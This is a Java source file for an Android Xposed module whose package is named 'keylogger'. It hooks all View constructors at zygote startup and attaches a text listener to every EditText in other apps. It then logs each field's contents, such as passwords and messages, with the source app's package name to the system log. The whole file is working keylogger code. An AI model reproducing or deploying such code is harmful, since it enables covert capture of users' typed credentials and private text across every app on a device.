package cn.nitsc.hlz.keylogger;

import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.widget.EditText;
import android.widget.TextView;

import de.robv.android.xposed.IXposedHookZygoteInit;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.XposedHelpers;

/**
 * Created by hlz on 2017/9/25.
 */

public class Hook  implements IXposedHookZygoteInit {

    @Override
    public void initZygote(StartupParam startupParam) throws Throwable {
        //Getting the View class on android
        Class c = XposedHelpers.findClass("android.view.View", null);
        //Hooking it to get access.
        XposedBridge.hookAllConstructors(c, new XC_MethodHook(){

            @Override
            protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                super.afterHookedMethod(param);
                try {
                    //if its not an instance of EditText, no need to hook it.
                    if (!(param.thisObject instanceof EditText))
                        return;

                    //Cast this object into an EditText object
                    final EditText et = (EditText) param.thisObject;

                    if(et.getContext().getPackageName().equals("cn.nitsc.hlz.keylogger"))
                        return;

                    //Adding a listener
                    et.addTextChangedListener(new TextWatcher() {

                        @Override
                        public void beforeTextChanged(CharSequence s, int start, int count, int after) {
                            //Do nothing
                        }

                        @Override
                        public void onTextChanged(CharSequence s, int start, int before, int count) {
                            //Do nothing
                        }

                        @Override
                        public void afterTextChanged(Editable s) {
                            //Log the text of the EditText and the package name of the app running(taken from the EditTexts context)
                            Logkey(et.getContext().getPackageName(),s.toString());
                        }

                    });
                } catch (Exception e) {
                    //Simply ignore
                }
            }

        });
    }

    private void Logkey(String packetname, String key){
        if(!key.equals(""))
            Log.i("keylogger", packetname + ":" + key);

    }

}


